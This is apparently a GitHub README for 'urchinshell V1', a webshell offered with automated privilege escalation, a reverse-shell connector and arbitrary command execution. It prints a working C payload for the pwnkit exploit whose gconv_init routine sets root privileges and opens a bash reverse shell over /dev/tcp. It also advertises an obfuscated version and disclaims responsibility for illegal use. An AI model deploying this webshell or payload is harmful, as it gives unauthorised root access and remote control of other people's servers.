# urchinshell V1

This webshell can be used for multi-purposed especially most if you want to manage your web server but you are in an emergency , so why not use a webshell:)

**DISCLAIMER : ILLEGAL USE OF OUR TOOLS INCLUDING THIS WEBSHELL WILL NOT HAVE US BEING HELD RESPONSIBLE AT ALL!**

![Screenshot_20220202_002639](https://user-images.githubusercontent.com/49201347/152054318-8a6bae94-48f2-4e92-a225-926e7e2baa95.png)

## How To Use

Currently has three features which are :
#### Automate-Privesc
this allows you to put in a base64 encoded string which contains the code run in poppy but with an execution of reverse-shell instead , which means when you execute it , it shall directly test and exploit pwnkit vulnerability using poppy, the payload should be something like this:
```c
#include <stdio.h>
#include <stdlib.h>

void gconv() {}

void gconv_init() {
  setuid(0);
  setgid(0);
  seteuid(0);
  setegid(0);  
  system("/usr/bin/sudo -u root /usr/bin/bash -c '/usr/bin/bash -i &>/dev/tcp/127.0.0.1/1337 <&1'");
  exit(0);
}
```
#### Reverse Shell
this is a classic one , you just put in your IP and Port and you shall definitely get shell access back to your listener if you are having trouble using the shell feature and you want to use a shell instead:

![Screenshot_20220202_001555](https://user-images.githubusercontent.com/49201347/152052883-bb57b9ef-61aa-4869-9170-84ea11120548.png)

#### Shell Exec
Allows you to execute shell commands , just by typing your command and clicking execute

![Screenshot_20220202_001938](https://user-images.githubusercontent.com/49201347/152053380-b68558ea-2778-46e9-931d-516234a74940.png)

## V2 UPDATE INFO
Version two will be updated with the following new features:

1. MYSQL Connector
2. Obfuscated Web-Shell
3. Real-Time Shell Spawn

## CONTACT US

If you wish to contribute or give a suggestion or need to contact us :

email : urchinsec@protonmail.com
discord : https://discord.gg/red66VCSEp
